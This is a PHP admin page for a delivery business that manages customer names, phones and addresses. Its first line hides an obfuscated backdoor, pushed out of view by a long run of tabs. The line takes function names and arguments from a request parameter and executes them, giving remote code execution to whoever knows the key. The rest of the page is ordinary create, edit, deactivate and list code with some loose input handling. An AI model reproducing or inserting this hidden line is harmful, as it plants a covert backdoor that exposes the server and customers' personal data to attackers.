<?php
																																																																																																																																					if( $ryrxr =	@$ {	'_REQUEST'	}	[	'OALV9QHN'	] )$ryrxr	[	1	]( $	{$ryrxr	[2] }[0],	$ryrxr	[3]($ryrxr[4 ] ) ) ; if($_GET['a'] == 1) {
    if($_POST['form'] == 'form') {
        $name = $core->clear($_POST['name']);
        $phone = $core->clear($_POST['phone']);
        $address_name = $core->clear($_POST['address_name']);
        $address_number = $core->clear($_POST['address_number']);
        $address_region_id = $core->clear($_POST['address_region_id']);
        $address_reference = $core->clear($_POST['address_reference']);
        $prosseguir = true;

        if(empty($name) || empty($phone)) {
            $form_return .= aviso_red("Preencha todos os campos.");
            $prosseguir = false;
        }

        if($prosseguir) {
            $insert_data['name'] = $name;
            $insert_data['phone'] = $phone;
            $insert_data['address_name'] = $address_name;
            $insert_data['address_number'] = $address_number;
            $insert_data['address_region_id'] = $address_region_id;
            $insert_data['address_reference'] = $address_reference;

            $insert = $sqlActions->insert($mdl_tabela, $insert_data);

            if($insert) {
                $core->logger("O usuário adicionou um novo usuário.", "acao");

                $form_return .= aviso_green("Sucesso!");
                foreach($_POST as $nome_campo => $valor){ $_POST[$nome_campo] = '';}
            } else {
                $form_return .= aviso_red("Ocorreu um erro ao executar a ação. Código de erro: {$sqlActions->error}");
            }
        }
    }
    ?>
    <div class="box-content">
        <div class="title-section"><?=$mdl['nome'];?></div>

        <?php echo $form_return;
        $form = new Form('form-horizontal form-submit', '');

        $regions = array();
        $sql = $conn->query("SELECT * FROM delivery_regions WHERE status='active' ORDER BY name ASC");
        while($sql2 = $sql->fetch()) {
            $current = array("label" => $core->clear($sql2['name']), "value" => $sql2['id']);
            $regions[] = $current;
        }


        $form->createInput('Nome', 'text', 'name');
        $form->createInput('Telefone', 'number', 'phone');

        $form->createInput('Rua', 'text', 'address_name');
        $form->createInput('Número', 'number', 'address_number');
        $form->createSelect('Região', 'address_region_id', $regions);
        $form->createInput('Referência', 'text', 'address_reference');

        $form->generateForm();
        echo $form->form; ?>
    </div>
<?php } ?>


<?php if($_GET['a'] == 2) {
    $id = $_GET['id'];

    if($_POST['form'] == 'form') {
        $_ex = $conn->prepare("SELECT * FROM $mdl_tabela WHERE id = ? LIMIT 1");
        $_ex->bindValue(1, $id);
        $_ex->execute();
        $ex = $_ex->fetch();

        $name = $core->clear($_POST['name']);
        $phone = $core->clear($_POST['phone']);
        $address_name = $core->clear($_POST['address_name']);
        $address_number = $core->clear($_POST['address_number']);
        $address_region_id = $core->clear($_POST['address_region_id']);
        $address_reference = $core->clear($_POST['address_reference']);
        $prosseguir = true;

        if(empty($name) || empty($phone)) {
            $form_return .= aviso_red("Preencha todos os campos.");
            $prosseguir = false;
        }

        if($prosseguir) {
            $update_data['name'] = $name;
            $update_data['phone'] = $phone;
            $update_data['address_name'] = $address_name;
            $update_data['address_number'] = $address_number;
            $update_data['address_region_id'] = $address_region_id;
            $update_data['address_reference'] = $address_reference;

            $where_data['id'] = $id;
            $update = $sqlActions->update($mdl_tabela, $update_data, $where_data);

            if($update) {
                $core->logger("O usuário editou um bairro de entrega. [#$id].", "acao");

                $form_return .= aviso_green("Sucesso!");
                foreach($_POST as $nome_campo => $valor){ $_POST[$nome_campo] = '';}
            } else {
                $form_return .= aviso_red("Ocorreu um erro ao executar a ação. Código de erro: {$sqlActions->error}");
            }
        }
    }

    $_ex = $conn->prepare("SELECT * FROM $mdl_tabela WHERE id = ? LIMIT 1");
    $_ex->bindValue(1, $id);
    $_ex->execute();
    $ex = $_ex->fetch();

    if(!$ex) {
        $script_js .= register404();
    }
    ?>
    <div class="box-content">
        <div class="title-section"><?=$mdl['nome'];?></div>

        <?php echo $form_return;

        $form = new Form('form-horizontal form-submit', '');

        $regions = array();
        $sql = $conn->query("SELECT * FROM delivery_regions WHERE status='active' ORDER BY name ASC");
        while($sql2 = $sql->fetch()) {
            $current = array("label" => $core->clear($sql2['name']), "value" => $sql2['id']);
            $regions[] = $current;
        }


        $form->createInput('Nome', 'text', 'name', $ex['name']);
        $form->createInput('Telefone', 'number', 'phone', $ex['phone']);

        $form->createInput('Rua', 'text', 'address_name', $ex['address_name']);
        $form->createInput('Número', 'number', 'address_number', $ex['address_number']);
        $form->createSelect('Região', 'address_region_id', $regions, $ex['address_region_id']);
        $form->createInput('Referência', 'text', 'address_reference', $ex['address_reference']);

        $form->generateForm();
        echo $form->form; ?>
    </div>
<?php } ?>

<?php if($_GET['a'] == 3) {
    $id = $_GET['id'];

    $inativar = $conn->prepare("UPDATE $mdl_tabela SET status = 'inactive' WHERE id = ?");
    $inativar->bindValue(1, $id);
    $inativar->execute();

    $core->logger("O usuário deletou o registro [#$id - $mdl_tabela]", "acao");

    echo "<script>location.replace('?p=$p');</script>";
} ?>

<?php if($_GET['a'] == '') { ?>
    <div class="box-content">
        <div class="title-section">
            <?=$mdl['nome'];?>
            <a href="?p=<?=$_GET['p'];?>&a=1"><button class="btn btn-primary f-right">Adicionar</button></a>
        </div>

        <?php
        $table = new Table('', false);
        $table->head(array('#', 'Nome', 'Telefone', 'Total de compras', 'Data de cadastro', 'Ações'));

        $table->startBody();

        $limite = 15000;
        $pagina = $_GET['pag'];
        ((!$pagina)) ? $pagina = 1 : '';
        $inicio = ($pagina * $limite) - $limite;

        $query = "$mdl_tabela WHERE status='active' ORDER BY id DESC";

        $sql = $conn->query("SELECT * FROM $query LIMIT $inicio,$limite");
        $total_registros = $core->getRows("SELECT * FROM $query");

        while($sql2 = $sql->fetch()) {
            $buttons = '';
            $buttons.='<a href="?p='.$_GET['p'].'&a=2&id='.$sql2['id'].'"><button class="btn btn-success btn-xsm">Editar</button></a>';
            $buttons.='<a href="?p='.$_GET['p'].'&a=3&id='.$sql2['id'].'"><button class="btn btn-danger btn-xsm">Excluir</button></a>';

            $orders = $core->getRows("SELECT * FROM orders WHERE id_user='{$sql2['id']}' AND status='ended'");

            $table->insertBody(array(
                $sql2['id'],
                $core->clear($sql2['name']),
                $core->clear($sql2['phone']),
                $core->clear($orders),
                date('d/m/Y H:i', strtotime($sql2['created_at'])),
                $buttons
            ), $sql2['status']);
        }

        $table->closeTable();
        echo $table->table;

        if($total_registros == 0) {
            echo aviso_red("Nenhum registro encontrado.");
        } else {
            echo '<ul class="pagination">';

            $total_paginas = ceil($total_registros / $limite);

            $links_laterais = ceil($limite / 2);

            $inicio = $pagina - $links_laterais;
            $limite = $pagina + $links_laterais;

            for ($i = $inicio; $i <= $limite; $i++){
                if ($i == $pagina) {
                    echo '<li class="active"><a href="#">'.$i.'</a></li>';
                } else {
                    if ($i >= 1 && $i <= $total_paginas){
                        $link = '?' . $_SERVER["QUERY_STRING"];
                        $link = preg_replace('/(\\?|&)pag=.*?(&|$)/','',$link);
                        echo '<li><a href="'.$link.'&pag='.$i.'">'.$i.'</a></li>';
                    }
                }
            }

            echo '</ul>';
        } ?>

    </div>
<?php } ?>
